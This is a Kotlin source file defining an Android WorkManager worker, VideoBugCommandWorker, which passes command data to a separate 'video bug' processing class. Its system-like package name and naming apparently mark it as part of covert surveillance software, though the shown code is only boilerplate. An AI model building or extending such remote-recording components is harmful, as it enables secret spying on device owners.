package com.android.services.workers.videobug

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.WorkerParameters
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.workers.base.BaseWorker
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.CoroutineScope

@HiltWorker
class VideoBugCommandWorker @AssistedInject constructor(
    @Assisted val context: Context,
    @Assisted parameters: WorkerParameters,
    val localDatabaseSource: LocalDatabaseSource,
    @ApplicationScope val coroutineScope: CoroutineScope
) :
    BaseWorker(context, parameters, VideoBugCommandProcessingBase.VIDEO_BUG_WORKER_TAG) {
    private lateinit var videoBugProcessingI: IWorkerProcessing
    override fun onCreate() {
        videoBugProcessingI =
            VideoBugCommandProcessingBaseImpll(context, localDatabaseSource, coroutineScope)
        videoBugProcessingI.onCreate()
    }

    override fun onStartCommand() {
        videoBugProcessingI.onStartCommand(data = inputData)
    }

    override fun onStop() {
        videoBugProcessingI.onDestroy()
    }


}